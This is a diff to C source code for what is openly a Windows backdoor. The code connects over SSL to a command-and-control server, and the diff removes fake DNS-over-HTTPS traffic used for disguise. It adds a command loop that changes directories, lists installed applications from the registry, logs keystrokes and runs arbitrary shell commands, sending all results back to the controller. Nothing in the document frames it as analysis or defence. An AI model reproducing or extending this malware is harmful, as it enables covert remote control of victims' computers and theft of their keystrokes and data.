@@ -7,9 +7,10 @@
 #include <ws2tcpip.h>
 #include <openssl/ssl.h>
 #include <openssl/err.h>
+#include <shellapi.h>
+#include <psapi.h>
 
 #pragma comment(lib, "ws2_32.lib")
-
 #define BUFFER_SIZE 1024
 #define C2_SERVER_IP "127.0.0.1"  // Replace with actual C2 server IP
 #define C2_SERVER_PORT 443        // Replace with actual C2 server port
@@ -49,31 +50,6 @@ void random_sleep() {
     Sleep(sleep_time);
 }
 
-// Function to generate random subdomains
-void generate_random_subdomain(char* buffer, size_t size) {
-    const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
-    for (size_t i = 0; i < size - 1; i++) {
-        buffer[i] = charset[rand() % (sizeof(charset) - 1)];
-    }
-    buffer[size - 1] = '\0';
-}
-
-// Create obfuscated DNS query
-void create_disguised_dns_query(char* buffer, const char* domain) {
-    char subdomain[BUFFER_SIZE];
-    generate_random_subdomain(subdomain, 10);  // Generate random subdomain
-    sprintf(buffer, "%s.%s", subdomain, domain);
-}
-
-// Mimic legitimate DoH request
-void mimic_legitimate_doh_request() {
-    const char* doh_request_template = "GET /dns-query?name=%s&type=A HTTP/1.1\r\nHost: cloudflare-dns.com\r\n\r\n";
-    char doh_request[BUFFER_SIZE];
-    sprintf(doh_request, doh_request_template, "example.com");
-    
-    printf("Mimicking DoH request: %s\n", doh_request);
-}
-
 // Establish connection to C2 server using SSL
 SSL* connect_to_c2(SSL_CTX* ctx) {
     struct sockaddr_in server_addr;
@@ -107,22 +83,18 @@ SSL* connect_to_c2(SSL_CTX* ctx) {
     return ssl;
 }
 
-// Send disguised data to C2 server
-void send_disguised_data(SSL* ssl) {
-    char dns_query[BUFFER_SIZE];
-    create_disguised_dns_query(dns_query, "example.com");
-
-    if (SSL_write(ssl, dns_query, strlen(dns_query)) <= 0) {
+// Send data to C2 server
+void send_data_to_c2(SSL* ssl, const char* data) {
+    if (SSL_write(ssl, data, strlen(data)) <= 0) {
         printf("Failed to send data to C2.\n");
     } else {
-        printf("Disguised data sent to C2 server.\n");
+        printf("Data sent to C2 server.\n");
     }
 }
 
-// Receive response from C2 server
-void receive_data_from_c2(SSL* ssl) {
-    char buffer[BUFFER_SIZE];
-    int bytes_received = SSL_read(ssl, buffer, sizeof(buffer) - 1);
+// Receive data from C2 server
+void receive_data_from_c2(SSL* ssl, char* buffer) {
+    int bytes_received = SSL_read(ssl, buffer, BUFFER_SIZE - 1);
     if (bytes_received > 0) {
         buffer[bytes_received] = '\0';
         printf("Received data from C2 server: %s\n", buffer);
@@ -131,17 +103,96 @@ void receive_data_from_c2(SSL* ssl) {
     }
 }
 
+// Change Directory (cd)
+void change_directory(SSL* ssl, const char* path) {
+    if (SetCurrentDirectory(path)) {
+        send_data_to_c2(ssl, "Directory changed successfully.\n");
+    } else {
+        send_data_to_c2(ssl, "Failed to change directory.\n");
+    }
+}
+
+// Get current working directory (pwd)
+void get_current_directory(SSL* ssl) {
+    char cwd[BUFFER_SIZE];
+    if (GetCurrentDirectory(BUFFER_SIZE, cwd)) {
+        send_data_to_c2(ssl, cwd);
+    } else {
+        send_data_to_c2(ssl, "Failed to get current directory.\n");
+    }
+}
+
+// List installed applications
+void list_installed_applications(SSL* ssl) {
+    char buffer[BUFFER_SIZE];
+    HKEY hUninstallKey = NULL, hAppKey = NULL;
+    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall", 0, KEY_READ, &hUninstallKey) != ERROR_SUCCESS) {
+        send_data_to_c2(ssl, "Failed to access registry for installed applications.\n");
+        return;
+    }
+    
+    DWORD index = 0;
+    char appName[BUFFER_SIZE];
+    while (RegEnumKeyEx(hUninstallKey, index, appName, &(DWORD){BUFFER_SIZE}, NULL, NULL, NULL, NULL) == ERROR_SUCCESS) {
+        snprintf(buffer, BUFFER_SIZE, "Application: %s\n", appName);
+        send_data_to_c2(ssl, buffer);
+        index++;
+    }
+    RegCloseKey(hUninstallKey);
+}
+
+// Save keystrokes for X time (capture for 10 seconds as example)
+void capture_keystrokes(SSL* ssl, int duration_seconds) {
+    char keystrokes[BUFFER_SIZE] = "";
+    DWORD startTime = GetTickCount();
+    
+    while ((GetTickCount() - startTime) / 1000 < duration_seconds) {
+        for (int key = 8; key <= 255; key++) {
+            if (GetAsyncKeyState(key) & 0x8000) {
+                char keychar = (char)key;
+                strncat(keystrokes, &keychar, 1);
+            }
+        }
+        Sleep(10);  // Avoid busy-looping too much
+    }
+    
+    send_data_to_c2(ssl, keystrokes);
+}
+
+// Run cmd command and send output to C2
+void run_cmd_command(SSL* ssl, const char* command) {
+    char buffer[BUFFER_SIZE];
+    FILE* pipe = _popen(command, "r");
+    if (!pipe) {
+        send_data_to_c2(ssl, "Failed to execute command.\n");
+        return;
+    }
+    while (fgets(buffer, BUFFER_SIZE, pipe) != NULL) {
+        send_data_to_c2(ssl, buffer);
+    }
+    _pclose(pipe);
+}
+
 // Main loop that communicates with the C2 server while performing random actions
 void main_loop(SSL* ssl) {
+    char buffer[BUFFER_SIZE];
     while (1) {
-        int random_action = rand() % 3;
+        // Receive command from C2
+        receive_data_from_c2(ssl, buffer);
 
-        if (random_action == 0) {
-            send_disguised_data(ssl);
-        } else if (random_action == 1) {
-            mimic_legitimate_doh_request();
+        if (strncmp(buffer, "CD ", 3) == 0) {
+            change_directory(ssl, buffer + 3);  // Change directory based on path in command
+        } else if (strcmp(buffer, "PWD") == 0) {
+            get_current_directory(ssl);  // Get current working directory
+        } else if (strcmp(buffer, "LIST_APPS") == 0) {
+            list_installed_applications(ssl);  // List installed applications
+        } else if (strncmp(buffer, "KEYLOG", 6) == 0) {
+            int duration = atoi(buffer + 7);  // Capture keystrokes for specified duration
+            capture_keystrokes(ssl, duration);
+        } else if (strncmp(buffer, "CMD ", 4) == 0) {
+            run_cmd_command(ssl, buffer + 4);  // Run specified command
         } else {
-            receive_data_from_c2(ssl);
+            printf("Unknown command received: %s\n", buffer);
         }
 
         random_sleep();
